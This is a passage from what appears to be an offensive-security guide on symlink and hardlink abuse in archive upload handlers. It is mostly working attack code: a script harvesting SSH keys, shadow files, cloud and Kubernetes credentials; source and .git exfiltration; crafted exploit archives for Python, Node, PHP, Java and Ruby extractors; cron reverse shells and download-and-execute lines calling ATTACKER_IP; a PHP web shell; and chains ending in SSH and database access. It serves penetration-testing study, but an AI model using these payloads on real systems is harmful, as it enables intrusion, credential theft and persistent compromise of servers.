    echo "[+] SSH access: ssh -i /tmp/symlink_key root@$(echo $TARGET | sed 's|https\?://||')"
    echo "[+] Cron shell: nc -lvnp 4444 (wait up to 60s)"
  else
    echo "[-] Direct access failed, checking alternatives..."
  fi
  
  cd /
  rm -rf "$WORKDIR"
  ```
  :::
::

## Targeted File Read Attacks

### High-Value File Targets

::tip{icon="i-lucide-book-open"}
Symlink file read is often the first step in an attack chain. Reading configuration files, credentials, and keys enables lateral movement and privilege escalation.
::

::tabs
  :::tabs-item{icon="i-lucide-key" label="Credential Files"}
  ```python
  #!/usr/bin/env python3
  """Targeted symlink read for credential harvesting"""
  
  import tarfile
  import requests
  import sys
  
  TARGET = sys.argv[1]
  UPLOAD_EP = sys.argv[2]
  ACCESS_PATH = sys.argv[3]
  COOKIE = sys.argv[4]
  
  credential_targets = {
      # System
      "sys_passwd":         "/etc/passwd",
      "sys_shadow":         "/etc/shadow",
      "sys_group":          "/etc/group",
      "sys_sudoers":        "/etc/sudoers",
      
      # SSH
      "ssh_root_rsa":       "/root/.ssh/id_rsa",
      "ssh_root_ed25519":   "/root/.ssh/id_ed25519",
      "ssh_root_ecdsa":     "/root/.ssh/id_ecdsa",
      "ssh_root_dsa":       "/root/.ssh/id_dsa",
      "ssh_root_auth":      "/root/.ssh/authorized_keys",
      "ssh_root_config":    "/root/.ssh/config",
      "ssh_root_known":     "/root/.ssh/known_hosts",
      
      # Common user SSH
      "ssh_ubuntu_rsa":     "/home/ubuntu/.ssh/id_rsa",
      "ssh_deploy_rsa":     "/home/deploy/.ssh/id_rsa",
      "ssh_admin_rsa":      "/home/admin/.ssh/id_rsa",
      "ssh_www_rsa":        "/home/www-data/.ssh/id_rsa",
      
      # Application configs
      "env_root":           "/var/www/html/.env",
      "env_app":            "/var/www/app/.env",
      "env_laravel":        "/var/www/html/laravel/.env",
      "wp_config":          "/var/www/html/wp-config.php",
      "django_settings":    "/var/www/html/settings.py",
      "rails_db":           "/var/www/html/config/database.yml",
      "rails_secrets":      "/var/www/html/config/secrets.yml",
      "rails_master_key":   "/var/www/html/config/master.key",
      "rails_credentials":  "/var/www/html/config/credentials.yml.enc",
      "node_env":           "/var/www/html/.env",
      "spring_props":       "/opt/app/application.properties",
      "spring_yml":         "/opt/app/application.yml",
      
      # Database configs
      "mysql_cnf":          "/etc/mysql/my.cnf",
      "mysql_debian_cnf":   "/etc/mysql/debian.cnf",
      "pg_hba":             "/etc/postgresql/14/main/pg_hba.conf",
      "redis_conf":         "/etc/redis/redis.conf",
      "mongo_conf":         "/etc/mongod.conf",
      
      # AWS
      "aws_creds":          "/root/.aws/credentials",
      "aws_config":         "/root/.aws/config",
      "aws_ubuntu_creds":   "/home/ubuntu/.aws/credentials",
      
      # GCP
      "gcp_creds":          "/root/.config/gcloud/application_default_credentials.json",
      "gcp_sa_key":         "/root/.config/gcloud/credentials.db",
      
      # Azure
      "azure_profile":      "/root/.azure/azureProfile.json",
      "azure_tokens":       "/root/.azure/accessTokens.json",
      
      # Docker
      "docker_config":      "/root/.docker/config.json",
      "docker_env":         "/proc/1/environ",
      
      # Kubernetes
      "k8s_token":          "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "k8s_ca":             "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
      "k8s_namespace":      "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
      
      # Process info
      "proc_environ":       "/proc/self/environ",
      "proc_cmdline":       "/proc/self/cmdline",
      "proc_maps":          "/proc/self/maps",
      
      # History
      "bash_history":       "/root/.bash_history",
      "mysql_history":      "/root/.mysql_history",
      "psql_history":       "/root/.psql_history",
      "python_history":     "/root/.python_history",
  }
  
  # Create archive
  with tarfile.open("/tmp/cred_harvest.tar.gz", "w:gz") as tar:
      for link_name, target_path in credential_targets.items():
          info = tarfile.TarInfo(name=link_name)
          info.type = tarfile.SYMTYPE
          info.linkname = target_path
          tar.addfile(info)
  
  # Upload
  s = requests.Session()
  s.headers['Cookie'] = COOKIE
  s.verify = False
  
  with open("/tmp/cred_harvest.tar.gz", "rb") as f:
      s.post(f"{TARGET}{UPLOAD_EP}", files={'file': ('backup.tar.gz', f)})
  
  # Harvest
  print(f"\n{'='*60}")
  print(f"  CREDENTIAL HARVEST RESULTS")
  print(f"{'='*60}\n")
  
  for link_name, target_path in credential_targets.items():
      r = s.get(f"{TARGET}{ACCESS_PATH}/{link_name}")
      if r.status_code == 200 and len(r.text.strip()) > 0:
          content = r.text.strip()
          if len(content) > 5:  # Filter empty/error responses
              print(f"\n[+] {target_path}")
              print(f"    {'─' * 50}")
              for line in content.split('\n')[:10]:
                  print(f"    {line}")
              if content.count('\n') > 10:
                  print(f"    ... ({content.count(chr(10))} total lines)")
  ```
  :::

  :::tabs-item{icon="i-lucide-cloud" label="Cloud Metadata"}
  ```bash
  # Symlink to cloud metadata endpoints via /proc/net
  # And cloud credential files
  
  # Create symlinks to cloud credential files
  ln -sf /root/.aws/credentials aws_creds
  ln -sf /root/.aws/config aws_config
  ln -sf /home/ubuntu/.aws/credentials aws_creds_ubuntu
  ln -sf /root/.config/gcloud/application_default_credentials.json gcp_creds
  ln -sf /root/.azure/azureProfile.json azure_profile
  ln -sf /root/.docker/config.json docker_config
  ln -sf /var/run/secrets/kubernetes.io/serviceaccount/token k8s_token
  ln -sf /var/run/secrets/kubernetes.io/serviceaccount/ca.crt k8s_ca
  ln -sf /proc/self/environ proc_env
  
  tar czf cloud_creds.tar.gz \
    aws_creds aws_config aws_creds_ubuntu \
    gcp_creds azure_profile docker_config \
    k8s_token k8s_ca proc_env
  
  rm -f aws_creds aws_config aws_creds_ubuntu \
    gcp_creds azure_profile docker_config \
    k8s_token k8s_ca proc_env
  
  curl -X POST https://target.com/upload \
    -F "file=@cloud_creds.tar.gz;filename=data.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Read cloud credentials
  echo "=== AWS Credentials ==="
  curl -s "https://target.com/uploads/aws_creds"
  
  echo "=== GCP Credentials ==="
  curl -s "https://target.com/uploads/gcp_creds"
  
  echo "=== K8s Service Account Token ==="
  curl -s "https://target.com/uploads/k8s_token"
  
  echo "=== Process Environment ==="
  curl -s "https://target.com/uploads/proc_env" | tr '\0' '\n'
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="Source Code / Config Exfil"}
  ```bash
  # Exfiltrate application source code via directory symlinks
  
  # Symlink to common app directories
  ln -sf /var/www/html app_source
  ln -sf /opt/app app_opt
  ln -sf /srv/www app_srv
  ln -sf /home/deploy/app app_deploy
  
  tar czf source_exfil.tar.gz app_source app_opt app_srv app_deploy
  rm -f app_source app_opt app_srv app_deploy
  
  curl -X POST https://target.com/upload \
    -F "file=@source_exfil.tar.gz;filename=project.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Download entire source tree
  wget -r -np -nH --cut-dirs=2 \
    --reject "index.html*" \
    "https://target.com/uploads/app_source/" \
    -P ./exfiltrated_source/
  
  # Target specific sensitive files
  for file in \
    ".env" "config/database.yml" "config/secrets.yml" \
    "wp-config.php" "settings.py" "config.php" \
    "application.properties" ".git/config" \
    "package.json" "composer.json" "Gemfile"; do
    echo "=== ${file} ==="
    curl -s "https://target.com/uploads/app_source/${file}" 2>/dev/null | head -30
    echo ""
  done
  ```
  :::
::

### Extracting Git Repository Data

::collapsible{icon="i-lucide-git-branch"}
**Symlink to .git directory for complete source code and commit history extraction**

```bash
# Symlink to .git directory
ln -sf /var/www/html/.git git_link
tar czf git_exfil.tar.gz git_link
rm git_link

curl -X POST https://target.com/upload \
  -F "file=@git_exfil.tar.gz;filename=assets.tar.gz" \
  -H "Cookie: session=SESS"

# Reconstruct git repository locally
mkdir -p stolen_repo/.git
cd stolen_repo

# Download git objects
for obj in HEAD config refs/heads/master refs/heads/main; do
  curl -s "https://target.com/uploads/git_link/${obj}" \
    -o ".git/${obj}" --create-dirs
done

# Get current HEAD commit
HEAD_HASH=$(cat .git/HEAD | cut -d' ' -f2)
HEAD_COMMIT=$(curl -s "https://target.com/uploads/git_link/${HEAD_HASH}")
echo "HEAD: ${HEAD_HASH} -> ${HEAD_COMMIT}"

# Download packed refs
curl -s "https://target.com/uploads/git_link/packed-refs" -o .git/packed-refs

# Download pack files
PACK_DIR="objects/pack"
curl -s "https://target.com/uploads/git_link/${PACK_DIR}/" | \
  grep -oE '[a-f0-9]{40}' | sort -u | while read hash; do
  curl -s "https://target.com/uploads/git_link/${PACK_DIR}/pack-${hash}.pack" \
    -o ".git/${PACK_DIR}/pack-${hash}.pack"
  curl -s "https://target.com/uploads/git_link/${PACK_DIR}/pack-${hash}.idx" \
    -o ".git/${PACK_DIR}/pack-${hash}.idx"
done

# Alternatively use git-dumper
pip install git-dumper
git-dumper "https://target.com/uploads/git_link/" stolen_repo/

# Search for secrets in history
cd stolen_repo
git log --all --oneline
git log --all -p | grep -iE "password|secret|key|token|api_key|aws_access" | head -50
```
::

## Framework and Library-Specific Exploitation

::accordion
  :::accordion-item{icon="i-lucide-hexagon" label="Python — tarfile / zipfile"}
  ```python
  # Python's tarfile PRESERVES symlinks by default
  # Python's zipfile can create symlinks via external_attr
  
  # Vulnerable code pattern:
  # import tarfile
  # tar = tarfile.open(uploaded_file)
  # tar.extractall(path='/uploads/')  ← VULNERABLE
  # tar.close()
  
  # Safe code would use:
  # for member in tar.getmembers():
  #     if member.issym() or member.islnk():
  #         continue  # Skip symlinks
  #     tar.extract(member, path='/uploads/')
  
  # Exploit: Standard tar with symlinks works directly
  import tarfile
  
  with tarfile.open("python_exploit.tar.gz", "w:gz") as tar:
      # Symlink for read
      sym = tarfile.TarInfo(name="read_passwd")
      sym.type = tarfile.SYMTYPE
      sym.linkname = "/etc/passwd"
      tar.addfile(sym)
      
      # Symlink for directory traversal write
      sym2 = tarfile.TarInfo(name="webroot")
      sym2.type = tarfile.SYMTYPE
      sym2.linkname = "/var/www/html"
      tar.addfile(sym2)
  
  # Upload to Python-based app (Django, Flask, FastAPI)
  # curl -X POST https://target.com/api/import \
  #   -F "file=@python_exploit.tar.gz" -H "Cookie: session=SESS"
  ```
  :::

  :::accordion-item{icon="i-lucide-hexagon" label="Node.js — node-tar / adm-zip / yauzl"}
  ```bash
  # node-tar (npm 'tar' package) — CVE-2021-32803, CVE-2021-32804
  # Older versions did not properly prevent symlink extraction
  
  # Create exploit tar
  python3 << 'PYEOF'
  import tarfile
  
  with tarfile.open("node_exploit.tar.gz", "w:gz") as tar:
      # Create symlink inside archive
      info = tarfile.TarInfo(name="node_modules/.cache")
      info.type = tarfile.SYMTYPE
      info.linkname = "/"
      tar.addfile(info)
      
      # Then write through it
      from io import BytesIO
      shell_content = b'const {execSync} = require("child_process");\nmodule.exports = (req,res) => res.end(execSync(req.query.cmd).toString());'
      info2 = tarfile.TarInfo(name="node_modules/.cache/var/www/html/shell.js")
      info2.size = len(shell_content)
      tar.addfile(info2, BytesIO(shell_content))
  
  print("[+] Created node_exploit.tar.gz")
  PYEOF
  
  # adm-zip — preserves symlinks in some versions
  # yauzl — depends on extraction implementation
  
  curl -X POST https://target.com/api/upload \
    -F "file=@node_exploit.tar.gz" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::accordion-item{icon="i-lucide-hexagon" label="PHP — ZipArchive / PharData"}
  ```bash
  # PHP ZipArchive::extractTo() follows symlinks in ZIP files
  # PharData::extractTo() follows symlinks in TAR files
  
  # Vulnerable code:
  # $zip = new ZipArchive();
  # $zip->open($uploaded_file);
  # $zip->extractTo('/uploads/');  ← VULNERABLE
  
  # Create exploit ZIP with symlinks (using Python)
  python3 << 'PYEOF'
  import zipfile, stat
  
  with zipfile.ZipFile("php_exploit.zip", "w") as zf:
      info = zipfile.ZipInfo("config_link")
      info.create_system = 3
      info.external_attr = (stat.S_IFLNK | 0o777) << 16
      zf.writestr(info, "/var/www/html/wp-config.php")
      
      info2 = zipfile.ZipInfo("env_link")
      info2.create_system = 3
      info2.external_attr = (stat.S_IFLNK | 0o777) << 16
      zf.writestr(info2, "/var/www/html/.env")
  
  print("[+] Created php_exploit.zip")
  PYEOF
  
  # Upload to WordPress/Drupal/Laravel
  curl -X POST https://target.com/upload \
    -F "file=@php_exploit.zip;filename=plugin.zip" \
    -H "Cookie: session=SESS"
  
  # Read through symlinks
  curl -s "https://target.com/uploads/config_link"
  curl -s "https://target.com/uploads/env_link"
  ```
  :::

  :::accordion-item{icon="i-lucide-hexagon" label="Java — java.util.zip / commons-compress"}
  ```bash
  # java.util.zip.ZipInputStream doesn't preserve symlinks
  # BUT Apache Commons Compress DOES support symlinks in TAR
  
  # commons-compress vulnerable pattern:
  # TarArchiveInputStream tarIn = new TarArchiveInputStream(input);
  # TarArchiveEntry entry;
  # while ((entry = tarIn.getNextTarEntry()) != null) {
  #     File destFile = new File(destDir, entry.getName());
  #     // Missing check: entry.isSymbolicLink()
  #     Files.copy(tarIn, destFile.toPath());
  # }
  
  # Create exploit TAR for Java targets
  python3 << 'PYEOF'
  import tarfile
  
  with tarfile.open("java_exploit.tar.gz", "w:gz") as tar:
      sym = tarfile.TarInfo(name="WEB-INF/config.properties")
      sym.type = tarfile.SYMTYPE
      sym.linkname = "/opt/tomcat/conf/tomcat-users.xml"
      tar.addfile(sym)
      
      sym2 = tarfile.TarInfo(name="META-INF/context.xml")
      sym2.type = tarfile.SYMTYPE
      sym2.linkname = "/opt/tomcat/conf/context.xml"
      tar.addfile(sym2)
  
  print("[+] Created java_exploit.tar.gz")
  PYEOF
  
  curl -X POST https://target.com/api/deploy \
    -F "file=@java_exploit.tar.gz" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::accordion-item{icon="i-lucide-hexagon" label="Ruby — rubyzip / Gem::Package"}
  ```bash
  # Ruby Gem packages are TAR files containing TAR.GZ
  # Gems can contain symlinks for arbitrary file read/write
  
  # Vulnerable pattern:
  # Zip::File.open(uploaded_file) do |zip|
  #   zip.each do |entry|
  #     entry.extract(dest_path)  ← VULNERABLE
  #   end
  # end
  
  # Create malicious gem with symlinks
  python3 << 'PYEOF'
  import tarfile
  from io import BytesIO
  
  # Inner tar.gz (gem data)
  inner = BytesIO()
  with tarfile.open(fileobj=inner, mode='w:gz') as tar:
      sym = tarfile.TarInfo(name="lib/config")
      sym.type = tarfile.SYMTYPE
      sym.linkname = "/var/www/html/.env"
      tar.addfile(sym)
  inner.seek(0)
  
  # Outer tar (gem format)
  with tarfile.open("exploit.gem", 'w') as tar:
      info = tarfile.TarInfo(name="data.tar.gz")
      info.size = len(inner.getvalue())
      tar.addfile(info, inner)
      
      metadata = b"--- !ruby/object:Gem::Specification\nname: exploit\nversion: !ruby/object:Gem::Version\n  version: '1.0'\n"
      meta_info = tarfile.TarInfo(name="metadata.gz")
      import gzip
      meta_gz = gzip.compress(metadata)
      meta_info.size = len(meta_gz)
      tar.addfile(meta_info, BytesIO(meta_gz))
  
  print("[+] Created exploit.gem")
  PYEOF
  ```
  :::
::

## Symlink to Arbitrary Write

### Configuration Overwrite via Symlink

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="SSH Authorized Keys"}
  ```bash
  # Generate attacker SSH key
  ssh-keygen -t ed25519 -f /tmp/symlink_key -N "" -q
  
  # Stage 1: Symlink to .ssh directory
  ln -sf /root/.ssh ssh_dir
  tar czf ssh_stage1.tar.gz ssh_dir
  rm ssh_dir
  
  curl -X POST https://target.com/upload \
    -F "file=@ssh_stage1.tar.gz;filename=config.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Stage 2: Write authorized_keys through symlink
  mkdir -p ssh_dir
  cp /tmp/symlink_key.pub ssh_dir/authorized_keys
  tar czf ssh_stage2.tar.gz ssh_dir/authorized_keys
  rm -rf ssh_dir
  
  curl -X POST https://target.com/upload \
    -F "file=@ssh_stage2.tar.gz;filename=update.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Connect via SSH
  TARGET_HOST=$(echo "https://target.com" | sed 's|https\?://||;s|/.*||')
  ssh -i /tmp/symlink_key root@${TARGET_HOST}
  
  # Try common user accounts
  for user in root ubuntu deploy admin www-data; do
    echo "[*] Trying ${user}..."
    ssh -i /tmp/symlink_key -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
      ${user}@${TARGET_HOST} "id" 2>/dev/null && break
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-clock" label="Cron Job Injection"}
  ```bash
  # Stage 1: Symlink to cron directory
  ln -sf /etc/cron.d cron_link
  tar czf cron_stage1.tar.gz cron_link
  rm cron_link
  
  curl -X POST https://target.com/upload \
    -F "file=@cron_stage1.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Stage 2: Write cron job through symlink
  mkdir -p cron_link
  
  # Reverse shell every minute
  echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' > cron_link/backdoor
  
  # Or download-and-execute
  echo '*/5 * * * * root curl http://ATTACKER_IP/payload.sh | bash' > cron_link/update
  
  tar czf cron_stage2.tar.gz cron_link/
  rm -rf cron_link
  
  curl -X POST https://target.com/upload \
    -F "file=@cron_stage2.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Start listener
  nc -lvnp 4444
  ```
  :::

  :::tabs-item{icon="i-lucide-file-cog" label="Web Server Config Overwrite"}
  ```bash
  # Overwrite Apache/Nginx configuration
  
  # Stage 1: Symlink to config directory
  ln -sf /etc/apache2/sites-enabled apache_conf
  ln -sf /etc/nginx/sites-enabled nginx_conf
  tar czf config_stage1.tar.gz apache_conf nginx_conf
  rm -f apache_conf nginx_conf
  
  curl -X POST https://target.com/upload \
    -F "file=@config_stage1.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Stage 2: Write malicious vhost config
  mkdir -p apache_conf nginx_conf
  
  # Apache: Enable PHP execution everywhere
  cat > apache_conf/backdoor.conf << 'EOF'
  <VirtualHost *:80>
      ServerName backdoor.local
      DocumentRoot /tmp
      <Directory /tmp>
          Options +ExecCGI
          AddHandler php-script .txt .log .tmp
          Require all granted
      </Directory>
  </VirtualHost>
  EOF
  
  # Nginx: Expose /etc as web directory
  cat > nginx_conf/backdoor << 'EOF'
  server {
      listen 8888;
      root /;
      autoindex on;
      location / {
          try_files $uri $uri/ =404;
      }
  }
  EOF
  
  tar czf config_stage2.tar.gz apache_conf/ nginx_conf/
  rm -rf apache_conf nginx_conf
  
  curl -X POST https://target.com/upload \
    -F "file=@config_stage2.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Config takes effect after server reload/restart
  # Check if new port is open
  curl -s "http://target.com:8888/etc/passwd"
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label=".env / Application Config"}
  ```bash
  # Stage 1: Symlink to application directory
  ln -sf /var/www/html app_dir
  tar czf env_stage1.tar.gz app_dir
  rm app_dir
  
  curl -X POST https://target.com/upload \
    -F "file=@env_stage1.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Stage 2: Overwrite .env to redirect database / leak debug info
  mkdir -p app_dir
  
  cat > app_dir/.env << 'EOF'
  APP_NAME=Pwned
  APP_ENV=local
  APP_DEBUG=true
  APP_KEY=base64:ATTACKER_CONTROLLED_KEY_HERE_32B=
  
  DB_CONNECTION=mysql
  DB_HOST=attacker.com
  DB_PORT=3306
  DB_DATABASE=target_db
  DB_USERNAME=root
  DB_PASSWORD=toor
  
  REDIS_HOST=attacker.com
  MAIL_HOST=attacker.com
  
  AWS_ACCESS_KEY_ID=
  AWS_SECRET_ACCESS_KEY=
  AWS_DEFAULT_REGION=us-east-1
  AWS_BUCKET=
  EOF
  
  tar czf env_stage2.tar.gz app_dir/.env
  rm -rf app_dir
  
  curl -X POST https://target.com/upload \
    -F "file=@env_stage2.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Application now connects to attacker's DB/Redis/SMTP
  # Debug mode enabled → stack traces with secrets
  ```
  :::
::

## Advanced Techniques

### Recursive Symlink / Symlink Loop

::collapsible{icon="i-lucide-repeat"}
**Create symlink loops to cause denial of service or bypass depth-limited traversal checks**

```bash
# Create recursive symlinks (DoS potential)
# loop1 → loop2, loop2 → loop1
python3 << 'PYEOF'
import tarfile

with tarfile.open("symlink_loop.tar.gz", "w:gz") as tar:
    # Symlink pointing to each other
    s1 = tarfile.TarInfo(name="loop_a")
    s1.type = tarfile.SYMTYPE
    s1.linkname = "loop_b"
    tar.addfile(s1)
    
    s2 = tarfile.TarInfo(name="loop_b")
    s2.type = tarfile.SYMTYPE
    s2.linkname = "loop_a"
    tar.addfile(s2)
    
    # Self-referencing symlink
    s3 = tarfile.TarInfo(name="self_loop")
    s3.type = tarfile.SYMTYPE
    s3.linkname = "self_loop"
    tar.addfile(s3)
    
    # Deep chain: a → b → c → d → /etc/passwd
    for i, name in enumerate(['chain_a', 'chain_b', 'chain_c']):
        s = tarfile.TarInfo(name=name)
        s.type = tarfile.SYMTYPE
        if i < 2:
            s.linkname = ['chain_b', 'chain_c', ''][i]
        else:
            s.linkname = '/etc/passwd'
        tar.addfile(s)

print("[+] Created symlink_loop.tar.gz")
PYEOF

# If extraction doesn't check for loops → 
# CPU/disk exhaustion during resolution
# Or bypasses "max depth" symlink resolution limits

curl -X POST https://target.com/upload \
  -F "file=@symlink_loop.tar.gz" \
  -H "Cookie: session=SESS"

# Check if chained symlink resolved
curl -s "https://target.com/uploads/chain_a"
# If shows /etc/passwd content → chain was followed
```
::

### Hardlink Exploitation

::note{icon="i-lucide-link-2"}
Hard links differ from symlinks — they share the same inode as the target file. Some systems that block symlinks may still allow hard links. TAR archives support both symlink and hardlink types.
::

::code-group
```python [Hardlink Archive Crafting]
#!/usr/bin/env python3
"""Create TAR with hard links for alternative symlink bypass"""

import tarfile
from io import BytesIO

def create_hardlink_tar(output, targets):
    with tarfile.open(output, "w:gz") as tar:
        for link_name, target_path in targets.items():
            info = tarfile.TarInfo(name=link_name)
            info.type = tarfile.LNKTYPE  # Hard link (not SYMTYPE)
            info.linkname = target_path
            info.size = 0
            tar.addfile(info)
            print(f"  [hardlink] {link_name} => {target_path}")
    
    print(f"\n[+] Created: {output}")

targets = {
    "passwd_hard": "/etc/passwd",
    "shadow_hard": "/etc/shadow",
    "key_hard":    "/root/.ssh/id_rsa",
    "env_hard":    "/var/www/html/.env",
}

create_hardlink_tar("hardlink_exploit.tar.gz", targets)
```

```bash [Upload and Test Hardlinks]
# Upload hardlink archive
curl -X POST https://target.com/upload \
  -F "file=@hardlink_exploit.tar.gz;filename=data.tar.gz" \
  -H "Cookie: session=SESS"

# Try to read through hardlinks
for link in passwd_hard shadow_hard key_hard env_hard; do
  echo "=== ${link} ==="
  curl -s "https://target.com/uploads/${link}"
  echo ""
done

# Hardlinks vs Symlinks:
# - Hardlinks share inode → modifying one modifies the other
# - Hardlinks cannot cross filesystem boundaries
# - Hardlinks cannot point to directories
# - Some extraction libraries treat them differently than symlinks
# - Hardlink creation may not be restricted when symlinks are
```
::

### Relative vs Absolute Symlink Strategies

::tabs
  :::tabs-item{icon="i-lucide-move-up-right" label="Absolute Symlinks"}
  ```bash
  # Absolute symlinks: Direct path to target
  # Pro: Simple, guaranteed path
  # Con: Easily detected by path validation
  
  ln -sf /etc/passwd abs_link
  tar czf absolute.tar.gz abs_link
  rm abs_link
  
  # Verify
  tar tvf absolute.tar.gz
  # lrwxrwxrwx ... abs_link -> /etc/passwd
  
  curl -X POST https://target.com/upload \
    -F "file=@absolute.tar.gz" \
    -H "Cookie: session=SESS"
  ```
  :::

  :::tabs-item{icon="i-lucide-corner-up-left" label="Relative Symlinks"}
  ```bash
  # Relative symlinks: Use ../ to reach target
  # Pro: May bypass absolute path filters
  # Con: Depends on extraction directory depth
  
  # If extracted to /var/www/html/uploads/extracted/
  # Need ../../../../etc/passwd
  
  for depth in $(seq 1 10); do
    prefix=$(printf '../%.0s' $(seq 1 $depth))
    link_name="rel_${depth}"
    ln -sf "${prefix}etc/passwd" "${link_name}"
  done
  
  tar czf relative.tar.gz rel_*
  rm -f rel_*
  
  curl -X POST https://target.com/upload \
    -F "file=@relative.tar.gz" \
    -H "Cookie: session=SESS"
  
  # Test which depth was correct
  for depth in $(seq 1 10); do
    result=$(curl -s "https://target.com/uploads/rel_${depth}")
    if echo "$result" | grep -q "root:"; then
      echo "[+] Correct depth: ${depth} (${prefix}etc/passwd)"
      break
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-git-compare" label="Bypass Path Validation"}
  ```bash
  # Some validators check for /etc, /root, /proc in symlink targets
  # Bypass with indirect references
  
  python3 << 'PYEOF'
  import tarfile
  
  with tarfile.open("bypass_validation.tar.gz", "w:gz") as tar:
      # Bypass: Use /proc/self/root as alternative to /
      sym = tarfile.TarInfo(name="bypass1")
      sym.type = tarfile.SYMTYPE
      sym.linkname = "/proc/self/root/etc/passwd"
      tar.addfile(sym)
      
      # Bypass: Relative path that avoids keyword
      sym2 = tarfile.TarInfo(name="bypass2")
      sym2.type = tarfile.SYMTYPE
      sym2.linkname = "../../../../../../tmp/../etc/passwd"
      tar.addfile(sym2)
      
      # Bypass: Double symlink chain
      # First link to tmp, second from tmp to target
      sym3 = tarfile.TarInfo(name="stage_a")
      sym3.type = tarfile.SYMTYPE
      sym3.linkname = "/tmp"
      tar.addfile(sym3)
      
      sym4 = tarfile.TarInfo(name="stage_a/../etc/passwd")
      sym4.type = tarfile.SYMTYPE
      sym4.linkname = "/etc/passwd"
      tar.addfile(sym4)
      
      # Bypass: Unicode normalization
      sym5 = tarfile.TarInfo(name="bypass_unicode")
      sym5.type = tarfile.SYMTYPE
      sym5.linkname = "/\u0065\u0074\u0063/\u0070\u0061\u0073\u0073\u0077\u0064"  # /etc/passwd in unicode
      tar.addfile(sym5)
  
  print("[+] Created bypass_validation.tar.gz")
  PYEOF
  
  curl -X POST https://target.com/upload \
    -F "file=@bypass_validation.tar.gz" \
    -H "Cookie: session=SESS"
  
  for name in bypass1 bypass2 stage_a bypass_unicode; do
    result=$(curl -s "https://target.com/uploads/${name}" 2>/dev/null)
    echo "$result" | grep -q "root:" && echo "[+] Bypass success: ${name}"
  done
  ```
  :::
::

## Chaining Techniques

### Chain 1 — Symlink Read → Credential Theft → SSH Access

::steps{level="4"}

#### Extract SSH Private Key via Symlink

```bash
ln -sf /root/.ssh/id_rsa key_link
ln -sf /root/.ssh/id_ed25519 key_ed25519
ln -sf /home/ubuntu/.ssh/id_rsa ubuntu_key
tar czf ssh_read.tar.gz key_link key_ed25519 ubuntu_key
rm -f key_link key_ed25519 ubuntu_key

curl -X POST https://target.com/upload \
  -F "file=@ssh_read.tar.gz" \
  -H "Cookie: session=SESS"
```

#### Download and Use Stolen Keys

```bash
# Download keys
curl -s "https://target.com/uploads/key_link" > stolen_rsa_key
curl -s "https://target.com/uploads/key_ed25519" > stolen_ed25519_key
curl -s "https://target.com/uploads/ubuntu_key" > stolen_ubuntu_key

chmod 600 stolen_rsa_key stolen_ed25519_key stolen_ubuntu_key

# Extract hostname
TARGET_HOST=$(echo "target.com" | sed 's|https\?://||;s|/.*||')

# Try each key
for key in stolen_rsa_key stolen_ed25519_key stolen_ubuntu_key; do
  [ ! -s "$key" ] && continue
  for user in root ubuntu admin deploy www-data; do
    echo "[*] Trying ${key} as ${user}..."
    ssh -i "$key" -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
      -o BatchMode=yes "${user}@${TARGET_HOST}" "id" 2>/dev/null
    [ $? -eq 0 ] && echo "[+] SUCCESS: ${user}@${TARGET_HOST} with ${key}" && break 2
  done
done
```

::

### Chain 2 — Symlink Read .env → Database Access → Data Exfiltration

::steps{level="4"}

#### Read Application Configuration

```bash
ln -sf /var/www/html/.env env_link
tar czf env_read.tar.gz env_link
rm env_link

curl -X POST https://target.com/upload \
  -F "file=@env_read.tar.gz" \
  -H "Cookie: session=SESS"

curl -s "https://target.com/uploads/env_link" | tee stolen_env.txt

# Extract database credentials
DB_HOST=$(grep DB_HOST stolen_env.txt | cut -d= -f2)
DB_PORT=$(grep DB_PORT stolen_env.txt | cut -d= -f2)
DB_NAME=$(grep DB_DATABASE stolen_env.txt | cut -d= -f2)
DB_USER=$(grep DB_USERNAME stolen_env.txt | cut -d= -f2)
DB_PASS=$(grep DB_PASSWORD stolen_env.txt | cut -d= -f2)

echo "Database: ${DB_USER}:${DB_PASS}@${DB_HOST}:${DB_PORT}/${DB_NAME}"
```

#### Connect to Database

```bash
# MySQL
mysql -h "${DB_HOST}" -P "${DB_PORT}" -u "${DB_USER}" -p"${DB_PASS}" "${DB_NAME}" -e "SHOW TABLES;"

# PostgreSQL
PGPASSWORD="${DB_PASS}" psql -h "${DB_HOST}" -p "${DB_PORT}" -U "${DB_USER}" -d "${DB_NAME}" -c "\\dt"

# Dump sensitive data
mysql -h "${DB_HOST}" -u "${DB_USER}" -p"${DB_PASS}" "${DB_NAME}" -e "SELECT * FROM users LIMIT 10;"
```

::

### Chain 3 — Symlink Write → Web Shell → Reverse Shell → Persistence

::steps{level="4"}

#### Plant Symlink to Web Root

```bash
ln -sf /var/www/html webroot_link
tar czf write_stage1.tar.gz webroot_link
rm webroot_link

curl -X POST https://target.com/upload \
  -F "file=@write_stage1.tar.gz" \
  -H "Cookie: session=SESS"
```

#### Write Web Shell Through Symlink

```bash
mkdir -p webroot_link
cat > webroot_link/.system.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
if(isset($_GET['dl'])) {
    header('Content-Type: application/octet-stream');
    readfile($_GET['dl']);
}
?>
EOF

tar czf write_stage2.tar.gz webroot_link/.system.php
rm -rf webroot_link

curl -X POST https://target.com/upload \
  -F "file=@write_stage2.tar.gz" \
  -H "Cookie: session=SESS"
```

#### Upgrade to Reverse Shell

```bash
# Verify shell
curl "https://target.com/.system.php?cmd=id"

# Reverse shell
